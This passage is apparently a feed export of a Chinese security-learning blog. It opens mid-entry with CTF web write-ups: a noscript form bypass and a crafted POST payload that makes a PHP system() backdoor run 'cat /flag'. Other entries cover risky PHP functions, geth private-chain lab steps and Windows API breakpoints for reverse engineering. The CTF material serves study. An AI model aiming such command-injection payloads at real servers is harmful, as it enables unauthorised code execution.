&lt;h1&gt;会赢吗？&lt;/h1&gt;<br>        &lt;h2&gt;现代最强的归来，五条悟的复活宣言！&lt;/h2&gt;<br>        &lt;p&gt;绝对的强者，由此而生的孤独，教会你爱的是....&lt;/p&gt;<br>        &lt;form id=&quot;winForm&quot; action=&quot;/api/flag/Ap3x&quot; method=&quot;post&quot;&gt;<br>            &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; id=&quot;csrf_token&quot; value=&quot;hfaousghashgfasbasiouwrda1_&quot;&gt;<br>            &lt;button type=&quot;submit&quot;&gt;会赢的！&lt;/button&gt;<br>        &lt;/form&gt;<br>        &lt;noscript&gt;<br>            &lt;form class=&quot;s&quot; action=&quot;/api/flag/Ap3x&quot; method=&quot;post&quot;&gt;<br>                &lt;input type=&quot;hidden&quot; name=&quot;csrf_token&quot; id=&quot;csrf_token&quot; value=&quot;hfaousghashgfasbasiouwrda1_&quot;&gt;<br>                &lt;button type=&quot;submit&quot;&gt;无量空处！！&lt;/button&gt;<br>            &lt;/form&gt;<br>        &lt;/noscript&gt;<br>        <br>        &lt;p id=&quot;message&quot;&gt;&lt;/p&gt;<br>        &lt;/div&gt;<br>        &lt;script&gt;<br>            document.querySelector(&#x27;form&#x27;).addEventListener(&#x27;submit&#x27;, function (event) &#123;<br>                    event.preventDefault();<br>                    alert(&quot;宿傩的领域太强了，有什么办法让他的领域失效呢？&quot;);<br>                &#125;);<br><br>                (function () &#123;<br>                    const originalConsoleLog = console.log;<br>                    console.log = function () &#123;<br>                        originalConsoleLog.apply(console, arguments);<br>                        alert(&quot;你觉得你能这么简单地获取到线索？&quot;);<br>                    &#125;;<br>                &#125;)();<br>        &lt;/script&gt;<br></code></pre></td></tr></table></figure><p>解释一下</p><ol><li>&lt;noscript&gt;的工作机制：<br>&lt;noscript&gt; 是一种特殊的 HTML 标签，它的内容只有在浏览器 禁用了 JavaScript 时才会显示。<br>当 JavaScript 处于启用状态时，浏览器会忽略 &lt;noscript&gt; 标签中的所有内容，页面不会渲染或执行 &lt;noscript&gt; 部分的内容。<br>只有在用户禁用 JavaScript 时，浏览器才会呈现 &lt;noscript&gt; 中的内容。</li><li>JavaScript 和 &lt;noscript&gt; 的互斥关系：<br>JavaScript 拦截的前提是它被启用：你页面中的 JavaScript 代码只有在 JavaScript 被启用时才会执行。当 JavaScript 启用时，表单提交被 event.preventDefault() 阻止，用户无法提交表单。<br>&lt;noscript&gt; 的存在前提是 JavaScript 被禁用：如果 JavaScript 被禁用，所有 JavaScript 代码都不会运行，表单拦截逻辑自然不会生效。在这种情况下，浏览器会渲染 &lt;noscript&gt; 标签内的内容，并允许用户与 &lt;noscript&gt; 中的表单进行交互，而不会受到 JavaScript 的影响。</li><li>&lt;noscript&gt; 中表单的提交：<br>当 JavaScript 被禁用时，&lt;noscript&gt; 标签中的表单就会被渲染，用户可以正常看到并提交表单。<br>因为浏览器完全忽略了 JavaScript 代码，拦截函数无法影响 &lt;noscript&gt; 内的表单提交。</li></ol><p>可恶竟然还有base64<br><img src="https://gitee.com/fogpost/photo/raw/master/202410012126644.png" srcset="/img/loading.gif" lazyload></p><h3 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h3><p><img src="https://gitee.com/fogpost/photo/raw/master/202410012130270.png" srcset="/img/loading.gif" lazyload><br>明显的robots协议，我们直接访问robots.txt，进入对应的php页面，查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute_cmd</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decrypt_request</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$key</span></span>) </span>&#123;<br>    <span class="hljs-variable">$decoded_key</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$reversed_cmd</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>) - <span class="hljs-number">1</span>; <span class="hljs-variable">$i</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span>--) &#123;<br>        <span class="hljs-variable">$reversed_cmd</span> .= <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-variable">$hashed_reversed_cmd</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$reversed_cmd</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hashed_reversed_cmd</span> !== <span class="hljs-variable">$decoded_key</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Invalid key&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$decrypted_cmd</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$decrypted_cmd</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">execute_cmd</span>(<span class="hljs-title function_ invoke__">decrypt_request</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>],<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>cmd0 为原本的命令<br>cmd为base64(cmd0).encode<br>key为md5(cmd[::-1]).encode<br>直接构造<br>cmd&#x3D;Y2F0IC9mbGFn&amp;key&#x3D;ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI&#x3D;<br>这个是cat &#x2F;flag还好没恶心人换名字</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php函数初识</title>
    <link href="/2024/09/30/php%E5%88%9D%E8%AF%86/"/>
    <url>/2024/09/30/php%E5%88%9D%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<p>本文讲对php的部分可能引起漏洞的部分函数进行讲解</p><span id="more"></span><h1 id="php函数初识"><a href="#php函数初识" class="headerlink" title="php函数初识"></a>php函数初识</h1><h2 id="1-phpinfo"><a href="#1-phpinfo" class="headerlink" title="1. phpinfo()"></a>1. phpinfo()</h2><p>phpinfo() 函数会显示 PHP 配置信息以及当前的 PHP 环境信息，包括服务器信息、操作系统信息、PHP 版本、已安装的扩展、环境变量等。这个函数通常用于调试和开发过程中查看 PHP 配置信息。</p><h2 id="2-eval"><a href="#2-eval" class="headerlink" title="2. eval()"></a>2. eval()</h2><p>eval() 函数会将传入的字符串作为 PHP 代码进行执行。如果传入的字符串包含恶意代码，eval() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&gt;&gt;&gt;x = <span class="hljs-number">7</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>( <span class="hljs-string">&#x27;3 * x&#x27;</span> )<br><span class="hljs-number">21</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;pow(2,2)&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;2 + 2&#x27;</span>)<br><span class="hljs-number">4</span><br>&gt;&gt;&gt; n=<span class="hljs-number">81</span><br>&gt;&gt;&gt; <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;n + 4&quot;</span>)<br><span class="hljs-number">85</span><br></code></pre></td></tr></table></figure><h2 id="3-preg-replace"><a href="#3-preg-replace" class="headerlink" title="3. preg_replace()"></a>3. preg_replace()</h2><p>preg_replace() 函数用于执行正则表达式替换操作。如果正则表达式不正确或者传入的替换字符串包含恶意代码，preg_replace() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><h2 id="4-include-和-require"><a href="#4-include-和-require" class="headerlink" title="4. include() 和 require()"></a>4. include() 和 require()</h2><ul><li>incluce 在用到时加载<br>include 的文件中出错了，主程序继续往下执行</li><li>require 在一开始就加载<br>require 的文件出错了，主程序也停了</li><li>_once 后缀表示已加载的不加载</li></ul><h2 id="5-file-get-contents"><a href="#5-file-get-contents" class="headerlink" title="5. file_get_contents()"></a>5. file_get_contents()</h2><p>file_get_contents() 函数用于读取文件内容。如果传入的文件路径包含恶意代码，file_get_contents() 函数将会执行这些恶意代码，从而可能导致代码注入漏洞。</p><h2 id="6-system"><a href="#6-system" class="headerlink" title="6. system()"></a>6. system()</h2><p>system() 函数用于执行系统命令。如果传入的命令包含恶意代码，system() 函数将会执行这些恶意代码，从而可能导致命令注入漏洞。</p><h2 id="7-exec"><a href="#7-exec" class="headerlink" title="7. exec()"></a>7. exec()</h2>]]></content>
    
    
    <categories>
      
      <category>网络</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链</title>
    <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链实验1"><a href="#区块链实验1" class="headerlink" title="区块链实验1"></a>区块链实验1</h1><p>第一张题目<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200906200.png" srcset="/img/loading.gif" lazyload><br>区块链的操作引导<br>第一步查看引导<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919655.png" srcset="/img/loading.gif" lazyload><br>第二步节点一<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919341.png" srcset="/img/loading.gif" lazyload><br>第三步节点二<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200919780.png" srcset="/img/loading.gif" lazyload><br>第四步添加节点<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200920107.png" srcset="/img/loading.gif" lazyload><br>第五步，选中特定节点<br>第六步，选中状态标识<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200921564.png" srcset="/img/loading.gif" lazyload><br>第七步节点卡片信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200922747.png" srcset="/img/loading.gif" lazyload><br>第八步切换连接状态<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200922040.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923900.png" srcset="/img/loading.gif" lazyload><br>第九步删除节点，操作期间删除被禁用<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923166.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200923943.png" srcset="/img/loading.gif" lazyload><br>第十步通信按钮检查日志变化<br>第十一步通信日志展示节点间通信记录<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200924117.png" srcset="/img/loading.gif" lazyload><br>第十二步显示选中节点的区块链状态<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200925174.png" srcset="/img/loading.gif" lazyload><br>第十二步区块概要，点击可查看全部信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200926983.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200926289.png" srcset="/img/loading.gif" lazyload><br>第十四步，节点二挖矿按钮<br>第十五步提供打包交易和选择挖矿按钮<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200927617.png" srcset="/img/loading.gif" lazyload><br>第十六步挖矿两次，观察，数据链数据变化包括区块和高度<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200929661.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200929913.png" srcset="/img/loading.gif" lazyload><br>第十七步观察余额<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200931902.png" srcset="/img/loading.gif" lazyload><br>第十八步交易<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200931858.png" srcset="/img/loading.gif" lazyload><br>第十九夫输入交易内容手续费选择UXTO创建交易<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200933819.png" srcset="/img/loading.gif" lazyload><br>第二十步启动交易打包挖矿<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200933749.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409200934133.png" srcset="/img/loading.gif" lazyload><br>第二十一步选择最后一个区块<br>第二十三步区块的详细信息<br><img src="https://gitee.com/fogpost/photo/raw/master/202409200935271.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>区块链2</title>
    <link href="/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE2/"/>
    <url>/2024/09/27/%E5%8C%BA%E5%9D%97%E9%93%BE2/</url>
    
    <content type="html"><![CDATA[<h1 id="区块链技术实验2"><a href="#区块链技术实验2" class="headerlink" title="区块链技术实验2"></a>区块链技术实验2</h1><h2 id="安装以太坊"><a href="#安装以太坊" class="headerlink" title="安装以太坊"></a>安装以太坊</h2><p>sudo apt clear cache<br>sudo apt update<br>sudo apt-get install golang<br>sudo apt-get install make<br>sudo apt-get install git<br>sudo apt install build-essential<br>sudo apt-get install libltdl-dev<br>wget <a href="https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.9.25.tar.gz">https://github.com/ethereum/go-ethereum/archive/refs/tags/v1.9.25.tar.gz</a><br>tar zxvf v1.9.25.tar.gz<br>获取压缩文件，并解压<br><img src="https://gitee.com/fogpost/photo/raw/master/202409250917601.png" srcset="/img/loading.gif" lazyload></p><h2 id="设置go代理"><a href="#设置go代理" class="headerlink" title="设置go代理"></a>设置go代理</h2><p>go env -w GO111MODULE&#x3D;on<br>go env -w GOPROXY&#x3D;<a href="https://mirrors.aliyun.com/goproxy/,direct">https://mirrors.aliyun.com/goproxy/,direct</a><br>cd go-ethereum-1.9.25<br>make geth<br>编译成功后添加path<br>nano .bashrc<br>#末尾添加<br>export PATH&#x3D;”$PATH:&#x2F;home&#x2F;kali&#x2F;go-ethereum-1.9.25&#x2F;build&#x2F;bin&#x2F;“<br>#ctrl+x 输入Y保存后执行<br>source .bashrc<br><img src="https://gitee.com/fogpost/photo/raw/master/202409250923077.png" srcset="/img/loading.gif" lazyload></p><h2 id="搭建私有链"><a href="#搭建私有链" class="headerlink" title="搭建私有链"></a>搭建私有链</h2><p>nano &#x2F;home&#x2F;kali&#x2F;genesis.json<br>#输入如下内容</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;config&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;chainId&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">15665883188</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;homesteadBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip150Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip150Hash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip155Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;eip158Block&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;byzantiumBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;constantinopleBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;petersburgBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;istanbulBlock&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ethash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;nonce&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x5ddf8f3e&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;extraData&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x47b760&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;difficulty&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x400&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;mixHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;coinbase&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;alloc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span> <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;number&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;gasUsed&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;parentHash&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0x0000000000000000000000000000000000000000000000000000000000000000&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/fogpost/photo/raw/master/202409250926397.png" srcset="/img/loading.gif" lazyload><br>相关说明<br>chainID:指定了独立的区块链网络 ID。网络 ID 在连接到其他节点的时候会用到，以太坊公网的网络 ID 是 1，为了不与公有链网络冲突，运行私有链节点的时候要指定自己的网络 ID。不同 ID 网络的节点无法相互连接。<br>alloc: 用来预置账号以及账号的以太币数量，因为私有链挖矿比较容易，所以我们不需要预置有币的账号，需要的时候自己创建即可以，默认为空即可。<br>coinbase: 矿工的账号，随便填即可。<br>difficulty: 设置当前区块的难度，如果难度过大，cpu挖矿就很难，这里设置较小难度。<br>extraData: 附加信息。这里要注意一下，新版本该值需要为16进制数据，以0x 开头。<br>gasLimit: 该值设置对GAS的消耗总量限制，用来限制区块能包含的交易信息总和，因为我们要做的是私有链，所以此处填最大。<br>nonce: nonce就是一个64位随机数(0x后一位为4个二进制位，故有16位），用于挖矿，注意他和mixhash的设置需要满足以太坊的Yellow paper, 4.3.4. Block Header Validity, (44)章节所描述的条件。<br>mixhash：与nonce配合用于挖矿，由上一个区块的一部分生成的hash。注意他和nonce的设置需要满足以太坊的Yellow paper, 4.3.4. Block Header Validity, (44)章节所描述的条件。<br>parentHash: 上一个区块的hash值，因为是创世块，所以这个值是0。<br>timestamp: 设置创世块的时间戳。  </p><h2 id="初始化创世区块"><a href="#初始化创世区块" class="headerlink" title="初始化创世区块"></a>初始化创世区块</h2><p>mkdir &#x2F;home&#x2F;kali&#x2F;privatechain<br>mv &#x2F;home&#x2F;kali&#x2F;genesis.json &#x2F;home&#x2F;kali&#x2F;privatechain<br>cd &#x2F;home&#x2F;kali&#x2F;privatechain<br>geth –datadir data0 init genesis.json<br>#返回successfully wrote genesis state 即成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270915848.png" srcset="/img/loading.gif" lazyload><br>成功生成创世区块<br>启动私有链<br>geth –identity “SCAU” –rpc –rpcport “8545” –datadir data0 –port “30303” –rpcapi “db,eth,net,web3” –allow-insecure-unlock –networkid 65534 –nodiscover console<br>‘’’<br>启动成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270917438.png" srcset="/img/loading.gif" lazyload><br>创建账户<br>personal.newAccount(“0000”)<br>personal.newAccount(“1234”)<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270921285.png" srcset="/img/loading.gif" lazyload><br>查看用户，我们创建了两个用户，并获取账号<br>personal.listAccounts<br>personal.listAccounts[0]<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270923613.png" srcset="/img/loading.gif" lazyload><br>查看账户余额，没有挖矿的情况下显示为0<br>eth.getBalance(personal.listAccounts[0])<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270923628.png" srcset="/img/loading.gif" lazyload><br>解锁我们的0号账户输入密码，就是我们创建账户时用的0000<br>personal.unlockAccount(personal.listAccounts[0]);<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270929356.png" srcset="/img/loading.gif" lazyload><br>然后我们开始挖矿<br>miner.start()一般用这个就行<br>注意这里开始挖矿后会提示Generating DAG in progress：生成DAG，它是用于以太坊工作量证明PoW算法的数据集，需要花一些时间去生成，是一个比较大的文件，每当生成30000块才会更新<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270930561.png" srcset="/img/loading.gif" lazyload><br>停止挖矿<br>miner.stop()<br>eth.accounts：枚举系统中的账户；<br>eth.getBalance()：查看账户余额，单位是 Wei（Wei 是以太坊中最小货币面额单位，类似比特币中的聪，1 ether &#x3D; 10^18 Wei）；<br>eth.blockNumber：列出区块总数；<br>eth.getTransaction()：获取交易；<br>eth.getBlock()：获取区块；<br>web3.fromWei()：Wei 换算成以太币；<br>web3.toWei()：以太币换算成 Wei；<br>txpool.status：交易池中的状态；<br>admin.addPeer()：连接到其他节点；<br>挖矿成功后可以查看账户余额<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270941668.png" srcset="/img/loading.gif" lazyload><br>打钱之前先解锁一下出钱的账户<br>personal.unlockAccount(personal.listAccounts[0]);<br>金额转换<br>amount &#x3D; web3.toWei(1,’ether’)<br>eth.sendTransaction({from:personal.listAccounts[0],to:personal.listAccounts[1],value:amount})<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270942094.png" srcset="/img/loading.gif" lazyload><br>交易没有发生，要在打包挖矿后才会发生<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270944030.png" srcset="/img/loading.gif" lazyload><br>开始挖矿，交易成功<br><img src="https://gitee.com/fogpost/photo/raw/master/202409270948911.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web3</category>
      
    </categories>
    
    
    <tags>
      
      <tag>course</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常见的API</title>
    <link href="/2024/09/27/%E5%B8%B8%E8%A7%81%E7%9A%84API/"/>
    <url>/2024/09/27/%E5%B8%B8%E8%A7%81%E7%9A%84API/</url>
    
    <content type="html"><![CDATA[<h3 id="常见的API接口查找方法"><a href="#常见的API接口查找方法" class="headerlink" title="常见的API接口查找方法"></a>常见的API接口查找方法</h3><p>写一些常见的API以后每次遇见我都会抄下来，写一下相关的解释和什么时候可以用到<br>我们要有一个想法，凡是这些api我们都知道这些都是系统所写好的东西，动态链接库给我们准备好的接口，就像c语言导入的头文件，但是很多强者也可能根本就不屑这些api自己实现，那么我们就完蛋了，但是也可以根据可能编写的代码，下断点，逆向本质就是由汇编看代码</p><h4 id="od快速查找"><a href="#od快速查找" class="headerlink" title="od快速查找"></a>od快速查找</h4><p>突然发现od早就有古人创建的api断电器了，可喜可贺可喜可贺<br><img src="https://gitee.com/fogpost/photo/raw/master/202409201016637.png" srcset="/img/loading.gif" lazyload></p><h4 id="od的命令行断点"><a href="#od的命令行断点" class="headerlink" title="od的命令行断点"></a>od的命令行断点</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/202409201018652.png" srcset="/img/loading.gif" lazyload></p><h4 id="模块名称查找"><a href="#模块名称查找" class="headerlink" title="模块名称查找"></a>模块名称查找</h4><p><img src="https://gitee.com/fogpost/photo/raw/master/202409201018703.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409201019644.png" srcset="/img/loading.gif" lazyload></p><h3 id="常见的api"><a href="#常见的api" class="headerlink" title="常见的api"></a>常见的api</h3><h4 id="MessageBoxA"><a href="#MessageBoxA" class="headerlink" title="MessageBoxA"></a>MessageBoxA</h4><p>这个人尽皆知，在出现类似登录的窗口时当我们选择登录按键时便会发现，有弹窗便可以在此api下断点，到达判断位置</p><h4 id="GetwindowsTestA"><a href="#GetwindowsTestA" class="headerlink" title="GetwindowsTestA"></a>GetwindowsTestA</h4><p>这个的话是在登录窗口无明显回显时使用的方法可以获取我们的窗口输入文本</p><h4 id="易语言的窗口特征ID"><a href="#易语言的窗口特征ID" class="headerlink" title="易语言的窗口特征ID"></a>易语言的窗口特征ID</h4><p>看到004012AC这句代码 PUSH  5201008了吗<br>PUSH 10001，告诉你，这个是易语言通用的，每个窗口ID语句上面都会有一个PUSH 10001</p><h4 id="Openfile"><a href="#Openfile" class="headerlink" title="Openfile"></a>Openfile</h4><p>打开文件的api构建，用到再说</p><h4 id="GetDlgItemInt"><a href="#GetDlgItemInt" class="headerlink" title="GetDlgItemInt"></a>GetDlgItemInt</h4><p>将获取的文本转化为整数</p><h4 id="SetWindowsTextA"><a href="#SetWindowsTextA" class="headerlink" title="SetWindowsTextA"></a>SetWindowsTextA</h4><p>将某个窗口或者字段中的文字进行设定所调用的api窗口哦</p><h3 id="主要的dll"><a href="#主要的dll" class="headerlink" title="主要的dll"></a>主要的dll</h3><p>看样子我后面还要了解一下，这些api在那些dll里面了</p><p>kernel32.dll、user32.dll、gdi32.dll</p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>web反序列化</title>
    <link href="/2024/09/27/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/27/web%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
